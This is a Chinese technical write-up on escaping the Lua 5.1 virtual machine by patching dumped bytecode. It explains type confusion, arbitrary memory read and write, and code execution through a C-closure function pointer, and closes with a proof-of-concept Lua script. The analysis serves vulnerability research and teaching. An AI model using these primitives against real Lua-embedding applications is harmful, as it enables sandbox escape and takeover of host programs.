# LUA脚本虚拟机逃逸技术分析

**Author:boywhp@126.com**

参考[https://gist.github.com/corsix/6575486](https://gist.github.com/corsix/6575486)

0x00 LUA数据泄露
============

* * *

LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。

```
asnum = loadstring(string.dump(function(x)
  for i = x, x, 0 do
    return i
  end
end):gsub("\96%z%z\128", "\22\0\0\128"))

```

LUA字节码固定长度32bits，4字节，定义如下：

主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。

asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码`\96%z%z\128`替换为`\22\0\0\128`，如下：

```
0071  60000080           [4] forprep    1   1        ; to [6]
0075  1E010001           [5] return     4   2      
0079  5F40FF7F           [6] forloop    1   -2       ; to [5] if loop

```

执行gsub函数后，forprep指令被替换为JMP to [6]，LUA解释器forprep指令对应代码如下：

```
case OP_FORPREP: {
        const TValue *init = ra;
        const TValue *plimit = ra+1;
        const TValue *pstep = ra+2;
        L->savedpc = pc;  /* next steps may throw errors */
        if (!tonumber(init, ra))
          luaG_runerror(L, LUA_QL("for") " initial value must be a number");
        else if (!tonumber(plimit, ra+1))
          luaG_runerror(L, LUA_QL("for") " limit must be a number");
        else if (!tonumber(pstep, ra+2))
          luaG_runerror(L, LUA_QL("for") " step must be a number");
        setnvalue(ra, luai_numsub(nvalue(ra), nvalue(pstep)));
        dojump(L, pc, GETARG_sBx(i));
        continue;

```

正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于字节码被替换为JMP，直接跳过了LUA类型检查，进入forloop指令。

```
case OP_FORLOOP: {
        lua_Number step = nvalue(ra+2);
        lua_Number idx = luai_numadd(nvalue(ra), step); /* increment index */
        lua_Number limit = nvalue(ra+1);
        if (luai_numlt(0, step) ? luai_numle(idx, limit)
                                : luai_numle(limit, idx)) {
          dojump(L, pc, GETARG_sBx(i));  /* jump back */
          setnvalue(ra, idx);  /* update internal index... */
          setnvalue(ra+3, idx);  /* ...and external index */
        }
        continue;
      }

```

forloop指令直接将循环参数转换为lua_Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua_Number。

LUA使用TValue表示通用数据对象，格式如下:

| Value(64bit) | tt(32bit) | padd(32bit) |
| --- | --- | --- |
| n | `LUA_TNUMBER` |  |
| `GCObject *gc; -> TString*` | `LUA_TSTRING` |  |
| `GCObject *gc; -> Closure*` | `LUA_TFUNCTION` |  |

0x01 LUA任意内存读/写
===============

* * *

```
read_mem = loadstring(string.dump(function(mem_addr) 
  local magic=nil
  local function middle()
    local f2ii, asnum = f2ii, asnum
    local lud, upval
    local function inner()
      magic = "01234567"
      local lo,hi = f2ii(mem_addr)
      upval = "commonhead16bits"..ub4(lo)..ub4(hi)
      lo,hi = f2ii(asnum(upval));lo = lo+24
      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)
    end
    inner()
    return asnum(magic)
  end
  magic = middle()
  return magic
end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))  --> move 0,3

```

先看最外部函数，对应的LUA字节码如下：

```
0785  A4000000           [1] closure    2   0        ; 2 upvalues
0789  00008000           [2] move       0   1      
078D  00000000           [3] move       0   0      
0791  C0000001           [4] move       3   2      
0795  DC808000           [5] call       3   1   2  
0799  40008001           [6] move       1   3      
079D  5E000001           [7] return     1   2      

```

LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。

closure 2 0 ：创建0号函数对象，结果保存到2号寄存器，具体代码如下：

```
case OP_CLOSURE: {
        Proto *p;
        Closure *ncl;
        int nup, j;
        p = cl->p->p[GETARG_Bx(i)];
        nup = p->nups;
        ncl = luaF_newLclosure(L, nup, cl->env);
        ncl->l.p = p;
        for (j=0; j<nup; j++, pc++) {
          if (GET_OPCODE(*pc) == OP_GETUPVAL)
            ncl->l.upvals[j] = cl->upvals[GETARG_B(*pc)];
          else {
            lua_assert(GET_OPCODE(*pc) == OP_MOVE);
            ncl->l.upvals[j] = luaF_findupval(L, base + GETARG_B(*pc));
          }
        }
        setclvalue(L, ra, ncl);
        Protect(luaC_checkGC(L));
        continue;
      }

```

LUA内部使用Proto 数据结构表示函数原型，记录函数的一些基本信息。LUA使用UpVal数据结构记录当前函数外部变量引用情况。如：

```
function parent()
  local upval=nil
  function child() upval="child" end
  child()
  print(upval) --output string child
end

```

父函数定义一个局部变量upval，子函数直接使用了该变量，此时父函数在创建闭包时会初始化upval列表，LUA编译器生成CLOSURE A Bx指令后，会自动插入MOVE 0, B伪指令，R(B)指示带入子函数的Upval寄存器编号。

```
0785  A4000000           [1] closure    2   0        ; 2 upvalues
0789  00008000           [2] move       0   1      
078D  00000000           [3] move       0   0      
0791  C0000001           [4] move       3   2     --R(3) = R(2)
0795  DC808000           [5] call       3   1   2  --Call R(3)

```

执行`gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))`【%1指示第一匹配项】，将`move 0 1`替换为`move 0 3`指令，而寄存器3对应的是一个CLOSURE对象。因此middle及inner函数里面的magic实际执行middle函数对象。

LUA使用CALL A B C字节指令处理函数调用，寄存器 R(A)持有要被调用的函数对象的引用。函数参数置于R(A)之后的寄存器中。参数个数(B-1),返回值个数(C-1)。如call 3 3 1 表示R(3)->CLOSURE 参数2个分别是R(4)、R(5)，无返回值。

```
case OP_CALL: {
        int b = GETARG_B(i);
        int nresults = GETARG_C(i) - 1;
        if (b != 0) L->top = ra+b;  /* else previous instruction set top */
        L->savedpc = pc;
        switch (luaD_precall(L, ra, nresults)) {
          case PCRLUA: {
            nexeccalls++;
            goto reentry;  /* restart luaV_execute over new Lua function */
          }

```

LUA使用CallInfo数据结构执行函数调用跟踪，在luaD_precall函数使用inc_ci函数创建新的函数调用信息。

```
#define inc_ci(L) \
  ((L->ci == L->end_ci) ? growCI(L) : \
   (condhardstacktests(luaD_reallocCI(L, L->size_ci)), ++L->ci))

```

lua_State->ci的call info for current function，每调用一个函数增加一个ci，RETRUN减少ci，CallInfo数据结构如下：

```
typedef struct CallInfo {
  StkId base;  /* base for this function */
  StkId func;  /* function index in the stack */
  StkId top;  /* top for this function */
  const Instruction *savedpc;
  int nresults;  /* expected number of results from this function */
  int tailcalls;  /* number of tail calls lost under this entry */
} CallInfo;

```

其中CallInfo 的func在luaD_precall函数中初始化指向R(A)对象

我们跟踪下inner函数大致流程：magic Upval通过修改字节码方式指向了middle函数，inner函数在返回前将magic赋值为一个字符串，然后执行OP_RETURN指令返回middle函数。OP_RETURN最终调用luaD_poscall执行L->ci--，切换回上层函数调用CallInfo信息，然后goto reentry，如下：

```
    LClosure *cl; 
reentry:  /* entry point */
    lua_assert(isLua(L->ci));
    pc = L->savedpc;
cl = &clvalue(L->ci->func)->l;
base = L->base;
k = cl->p->k;

```

其中的&clvalue(L->ci->func)直接将ci->func转换为Closure*指针，但inner函数已经将ci->func对象修改为一个字符串对象，此后k = cl->p->k行获取函数原型的常量表。

先看下字符串对象和Closure对象的内存布局。

![p1](http://drops.javaweb.org/uploads/images/507f5001868e1af08bf0d6dd63e709d7c8fb30b3.jpg)

cl->p对应TString第9个字符串开始的内容，magic在inner函数被初始化为"01234567"，将前8字节填充，并拼接两个内存指针，【..为LUA字符串连接符】如下：

`magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)`

ub4函数将一个32位整数转换为字符串，lo、hi分别对应64bit内存地址的低、高32位。该内存地址指向

`lo,hi = f2ii(asnum(upval));lo = lo+24`

注意upval是字符串类型（头长度24），因此lo+24刚好指向字符串内容，因此cl->p实际指向"commonhead16bits"..ub4(lo)..ub4(hi)

cl->p->k，对应的数据结构定义如下：

```
typedef struct Proto {
  CommonHeader;
  TValue *k;  /* constants u

```

其中CommonHeader内存对齐后占用16字节，因此k指向我们传递的内存地址。

同理cl->upvals[0]也指向我们构造的内存地址。

```
typedef struct UpVal {
  CommonHeader;
  TValue *v;  /* points to stack or to its own value */

```

此后执行middle函数执行return asnum(magic)语句，对应字节码如下：

```
MOVE        5  1
GETUPVAL    6  0    ; magic
TAILCALL    5  2  0
RETURN      5  0

```

R(5) = R(1) = asnum函数对象，执行GETUPVAL 6 0 ，并将R(6)作为函数参数1调用asnum函数，最后返回asnum读取结果。

```
case OP_GETUPVAL: {
  int b = GETARG_B(i);
  setobj2s(L, ra, cl->upvals[b]->v);
  continue;

```

GETUPVAL 6 0 其中b=0因此cl->upvals[b]->v正是我们构造的内存地址，setobj2s函数从对应的内存地址复制数据到R(6)，此后通过asnum读取内容，实现任意内存地址读操作。同理如果在middle函数中对magic进行赋值，即可实现对任意地址写内存（实际会写8字节数值以及4字节的tt类型）

0x02 代码执行
=========

* * *

LUA使用OP_CALL进行函数调用，luaD_precall中处理了C函数CALL，如下

```
/* if is a C function, call it */
    CallInfo *ci;
    int n;
    ci = inc_ci(L);  /* now `enter' new function */
    ci->func = restorestack(L, funcr);
    L->base = ci->base = ci->func + 1;
    ci->top = L->top + LUA_MINSTACK;
    ci->nresults = nresults;
    lua_unlock(L);
    n = (*curr_func(L)->c.f)(L);  /* do the actual call */

```

LUA使用lua_pushcclosure函数创建C函数闭包对象，LUA基础库luaB_cowrap会调用lua_pushcclosure，创建一个CClosure *对象，具体LUA脚本如下：

```
co = coroutine.wrap(function() end)

```

CClosure数据结构内存布局如下：

![p2](http://drops.javaweb.org/uploads/images/16b6ec161d10fdd6a48b7dd6833f5107b44be323.jpg)

其object偏移位置32为函数指针f，通过前面的内存写技术可以将f替换为指定的函数地址即可实现任意代码执行。

0x03 附：POC代码
============

* * *

```
asnum = loadstring(string.dump(function(x)
  for i = x, x, 0 do
    return i
  end
end):gsub("\96%z%z\128", "\22\0\0\128"))

ub4 = function(x) -- Convert little endian uint32_t to char[4]
  local b0 = x % 256; x = (x - b0) / 256
  local b1 = x % 256; x = (x - b1) / 256
  local b2 = x % 256; x = (x - b2) / 256
  local b3 = x % 256
  return string.char(b0, b1, b2, b3)
end

f2ii = function(x) -- Convert double to uint32_t[2]
  if x == 0 then return 0, 0 end
  if x < 0 then x = -x end

  local e_lo, e_hi, e, m = -1075, 1023
  while true do -- this loop is math.frexp
    e = (e_lo + e_hi)
    e = (e - (e % 2)) / 2
    m = x / 2^e
    if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
  end

  if e+1023 <= 1 then
    m = m * 2^(e+1074)
    e = 0
  else
    m = (m - 0.5) * 2^53
    e = e + 1022
  end

  local lo = m % 2^32
  m = (m - lo) / 2^32
  local hi = m + e * 2^20
  return lo, hi
end

ii2f = function(lo, hi) -- Convert uint32_t[2] to double
  local m = hi % 2^20
  local e = (hi - m) / 2^20
  m = m * 2^32 + lo

  if e ~= 0 then
    m = m + 2^52
  else
    e = 1
  end
  return m * 2^(e-1075)
end

read_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594
  local magic=nil
  local function middle()
    local f2ii, asnum = f2ii, asnum
    local lud, upval
    local function inner()
      magic = "01234567"
      local lo,hi = f2ii(mem_addr)
      upval = "commonhead16bits"..ub4(lo)..ub4(hi)
      lo,hi = f2ii(asnum(upval));lo = lo+24
      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)
    end
    inner()
    return asnum(magic)
  end
  magic = middle()
  return magic
end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))  --> move 0,3

x="AAAABBBB"
l,h=f2ii(asnum(x))
x=ii2f(l+24,h)
print(f2ii(read_mem(x)))
```